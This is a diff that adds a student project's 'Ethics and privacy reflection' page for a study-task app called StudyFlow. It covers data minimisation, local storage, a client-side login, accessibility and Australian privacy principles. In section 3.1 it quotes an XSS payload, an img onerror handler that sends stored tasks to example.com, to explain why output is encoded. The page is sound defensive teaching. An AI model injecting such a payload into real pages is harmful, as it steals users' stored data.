@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en-AU">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Ethics and privacy reflection — StudyFlow</title>
+  <link rel="stylesheet" href="../css/styles.css">
+</head>
+<body>
+
+  <header class="site-header">
+    <div class="wrap header-inner">
+      <a class="brand" href="index.html">
+        <span class="brand-mark" aria-hidden="true">SF</span>
+        <span>StudyFlow</span>
+      </a>
+      <nav aria-label="Main">
+        <ul class="nav">
+          <li><a href="index.html">Home</a></li>
+          <li><a href="tasks.html">Study Tasks</a></li>
+          <li><a href="blog.html">Project Plan &amp; Blog</a></li>
+          <li><a href="ethics.html">Ethics &amp; Privacy</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <main>
+    <div class="wrap">
+      <div class="prose">
+
+        <h1>Ethics and privacy reflection</h1>
+        <p class="lede">
+          What this application does to handle student data responsibly, what it
+          cannot promise, and why the difference matters when user-generated content
+          is involved.
+        </p>
+
+        <h2>1. The honest starting point</h2>
+
+        <p>
+          StudyFlow collects information about a person's study life: what they have
+          to do, for which course, and by when. That data is not sensitive in the
+          medical or financial sense, but it is still personal. It reveals which
+          courses someone is enrolled in, when they are under pressure, and — through
+          the notes field — whatever they choose to write about their own progress or
+          difficulties. A task list is a small diary of someone's semester.
+        </p>
+
+        <p>
+          My design position was borrowed from Privacy by Design: privacy should be
+          built into the architecture, not bolted on as a settings page (Cavoukian,
+          2009). Seven of those principles map onto concrete decisions in this
+          application, and the eighth — the one I could not satisfy — is discussed in
+          section 5.
+        </p>
+
+        <h2>2. Features that support ethical data use</h2>
+
+        <h3>2.1 Data minimisation</h3>
+        <p>
+          The system asks for exactly six fields: title, course code, course name, due
+          date, description and notes. There is no account registration, no email
+          address, no phone number, no date of birth and no student ID. Every field
+          that is absent is a field that cannot leak, be sold or be subpoenaed. The
+          notes field is optional, and the interface labels it as such, because
+          optionality is what allows a user to withhold information they would rather
+          not record.
+        </p>
+
+        <h3>2.2 Purpose limitation</h3>
+        <p>
+          The data is used for one thing: drawing the task table. It is not sent to a
+          server, aggregated, profiled or used to infer anything about the user. There
+          are no analytics scripts, no advertising identifiers and no third-party
+          fonts or trackers on these pages — every asset, including the illustrations,
+          is a local file. A user opening the site in their browser is not making a
+          request to anybody except the machine the files sit on.
+        </p>
+
+        <h3>2.3 Local-only storage</h3>
+        <p>
+          Tasks are written to <code>localStorage</code> under a single key
+          (<code>studyflow.tasks.v1</code>) and never leave the browser. This is a
+          deliberate trade-off. The benefit is that there is no central database to
+          breach, no backup to misconfigure, and no retention period to enforce — when
+          the user clears their browser storage, the data is genuinely gone. The cost
+          is that the data is not encrypted at rest, is readable by any script running
+          on the same origin, and is not synchronised across devices.
+        </p>
+
+        <h3>2.4 Restricting access behind a login</h3>
+        <p>
+          The task page is not visible until the user authenticates. Practically, this
+          prevents someone glancing at the screen — or opening the page on a shared
+          machine — from reading another person's task list. The session is held in
+          <code>sessionStorage</code>, so it ends when the tab closes rather than
+          persisting for weeks on a library computer.
+        </p>
+
+        <h3>2.5 Input validation as an ethical control</h3>
+        <p>
+          Validation is usually framed as a data-quality feature. It is also an
+          integrity control: rejecting nonsense input at the boundary keeps the stored
+          record trustworthy for the person who will read it later. The due-date rule
+          is the clearest example — refusing a date in the past prevents a task from
+          being silently born overdue, which would misrepresent the user's own history
+          to them.
+        </p>
+
+        <h2>3. Features that support data privacy</h2>
+
+        <h3>3.1 Output encoding instead of HTML injection</h3>
+        <p>
+          User text is inserted with <code>textContent</code>, never
+          <code>innerHTML</code>. This matters more than it looks. If a task were
+          rendered with <code>innerHTML</code>, a title such as
+          <code>&lt;img src=x onerror="fetch('https://example.com?d='+localStorage.studyflow.tasks.v1)"&gt;</code>
+          would execute, and every stored task could be exfiltrated to a third party.
+          Because the data is treated as text, that string is displayed literally and
+          does nothing. The rule is applied everywhere a user value reaches the DOM,
+          including the delete confirmation text.
+        </p>
+
+        <h3>3.2 No unnecessary identifiers</h3>
+        <p>
+          The login gate uses a fixed demonstration account rather than personalised
+          accounts. That is a limitation, but it also means the application never
+          stores a name, an email or a password belonging to a real person. There is
+          nothing to reset, nothing to enumerate and nothing to phish.
+        </p>
+
+        <h3>3.3 Deletion that actually deletes</h3>
+        <p>
+          Removing a task removes it from the array and rewrites the stored JSON
+          immediately; there is no "soft delete" flag and no shadow copy. Users can
+          also erase everything by clearing site data in the browser, and the interface
+          does not pretend otherwise.
+        </p>
+
+        <h3>3.4 Transparency</h3>
+        <p>
+          The sign-in panel states that this is a demonstration system and that
+          authentication is client-side only, with a link to this page. A privacy
+          notice that a student can read and understand in thirty seconds is worth
+          more than a long policy nobody opens — but only if it is accurate, including
+          about its own weaknesses.
+        </p>
+
+        <h3>3.5 Accessibility as an ethical requirement</h3>
+        <p>
+          A tool that a student with a visual impairment cannot use has effectively
+          excluded them. Labels are associated with every input, errors are announced
+          through <code>role="alert"</code> and tied to their field with
+          <code>aria-describedby</code>, the current page is marked with
+          <code>aria-current</code>, focus is moved deliberately after validation and
+          after the delete dialog closes, and text sizes are set in <code>rem</code> so
+          they respect browser zoom. Contrast ratios were checked against the WCAG
+          2.2 AA thresholds.
+        </p>
+
+        <h2>4. Where the design has to make a judgement call</h2>
+
+        <p>
+          Storing tasks locally protects privacy but weakens durability: clearing
+          cookies and site data, or using a different browser, loses the list without
+          warning. I chose privacy over durability because a lost task list is
+          recoverable — the student knows what they had to do — while a leaked one is
+          not. The interface hints at this by keeping the data in the browser and never
+          implying that a copy exists elsewhere.
+        </p>
+
+        <p>
+          The login gate is a second judgement call. It provides a real but limited
+          benefit: it stops casual access, not a determined one. Anything stored in the
+          browser can be read by anyone with access to that browser's developer tools.
+          Presenting it as strong security would be dishonest, so the page says what it
+          is.
+        </p>
+
+        <h2>5. What this system cannot do — and what a real one would need</h2>
+
+        <p>
+          Client-side authentication is not authentication. In a production version,
+          the following would be non-negotiable:
+        </p>
+
+        <ul>
+          <li>
+            <strong>Server-side sessions and hashed credentials</strong> — passwords
+            stored with a slow salted hash (bcrypt or Argon2), never in client code,
+            and account state held on a server the user cannot edit.
+          </li>
+          <li>
+            <strong>Transport encryption</strong> — HTTPS everywhere, so data in transit
+            cannot be read or modified.
+          </li>
+          <li>
+            <strong>Collection notice and consent</strong> — a plain-language notice at
+            the point of collection, consistent with the Australian Privacy Principles
+            (especially APP 1, open and transparent management, and APP 5, notification
+            of collection).
+          </li>
+          <li>
+            <strong>Access, correction and deletion rights</strong> — a real export and
+            a real delete, not "clear your browser data and hope".
+          </li>
+          <li>
+            <strong>Retention limits</strong> — a defined period after which inactive
+            data is destroyed, because indefinite retention is itself a privacy risk.
+          </li>
+        </ul>
+
+        <p>
+          Naming these gaps is part of the reflection rather than a disclaimer. The
+          ethical obligation of a developer is not to claim that a student prototype is
+          secure; it is to be precise about what it protects, and to make sure the
+          person using it is not misled into trusting it more than it deserves.
+        </p>
+
+        <h2>6. Conclusion</h2>
+
+        <p>
+          StudyFlow handles a modest amount of personal data, and it tries to handle it
+          in a way that would still look defensible if the user read the source code —
+          which, in a GitHub repository, they can. Data is minimised, kept local,
+          encoded on output, deletable, and described honestly. The remaining weakness
+          is architectural rather than accidental: a client-side application cannot
+          offer the authentication guarantees of a server-side one, and the page says
+          so rather than papering over it.
+        </p>
+
+        <h2>References</h2>
+        <ul class="small">
+          <li>Cavoukian, A. (2009) <em>Privacy by Design: The 7 Foundational Principles</em>. Information and Privacy Commissioner of Ontario.</li>
+          <li>Office of the Australian Information Commissioner (2026) <em>Australian Privacy Principles</em>. Available at: https://www.oaic.gov.au/privacy/australian-privacy-principles (accessed 12 November 2026).</li>
+          <li>W3C (2023) <em>Web Content Accessibility Guidelines (WCAG) 2.2</em>. Available at: https://www.w3.org/TR/WCAG22/ (accessed 12 November 2026).</li>
+          <li>OWASP Foundation (2025) <em>Cross Site Scripting Prevention Cheat Sheet</em>. Available at: https://cheatsheetseries.owasp.org/ (accessed 12 November 2026).</li>
+        </ul>
+
+      </div>
+    </div>
+  </main>
+
+  <footer class="site-footer">
+    <div class="wrap footer-inner">
+      <p>StudyFlow — Assessment 3.1, INFO 1012. Built with HTML, CSS and JavaScript.</p>
+      <p>Current date and time: <span id="clock">—</span></p>
+    </div>
+  </footer>
+
+  <script src="../js/main.js"></script>
+</body>
+</html>
